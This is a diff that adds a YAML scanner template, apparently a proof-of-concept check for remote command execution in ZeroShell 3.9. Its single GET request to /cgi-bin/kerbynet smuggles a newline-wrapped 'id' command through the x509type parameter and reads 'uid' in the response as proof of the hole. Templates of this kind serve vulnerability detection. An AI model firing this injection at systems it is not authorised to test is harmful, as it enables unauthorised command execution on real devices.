@@ -1,0 +1,16 @@
+name: zeroshell-3.9-type-rce
+set:
+  s0: randomInt(10000,99999)
+groups:
+  poc:  
+    - method: GET
+      path: /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27
+      follow_redirects: false 
+      body:
+      expression: >-
+        response.status == 200 && response.body.bcontains(b"uid")
+
+detail: 
+  links: 
+  authors:
+
